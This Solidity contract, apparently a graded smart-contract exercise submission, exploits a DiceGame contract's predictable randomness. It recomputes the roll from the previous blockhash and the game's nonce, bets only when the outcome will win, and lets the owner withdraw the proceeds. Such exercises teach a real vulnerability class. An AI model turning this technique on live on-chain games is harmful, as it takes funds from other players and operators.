pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    /////////////////
    /// Errors //////
    /////////////////

    error NotEnoughETH(uint256 required, uint256 available);
    error NotWinningRoll(uint256 roll);
    error InsufficientBalance(uint256 requested, uint256 available);

    //////////////////////
    /// State Variables //
    //////////////////////

    DiceGame public diceGame;

    ///////////////////
    /// Constructor ///
    ///////////////////

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    ///////////////////
    /// Functions /////
    ///////////////////

    receive() external payable {}

    function riggedRoll() external {
        uint256 rigCMoney = address(this).balance;
        if (rigCMoney < 0.002 ether)
            revert NotEnoughETH(0.002 ether, rigCMoney);

        //logic for the winning roll
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
        );
        uint256 roll = uint256(hash) % 16;

        if (roll < 6) diceGame.rollTheDice{value: 0.002 ether}();
        else revert NotWinningRoll(roll);
    }

    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        uint256 money = address(this).balance;
        if (money < _amount) revert InsufficientBalance(_amount, money);
        (bool success, ) = payable(_addr).call{value: _amount}("");
        require(success, "Withdraw failed");
    }
}
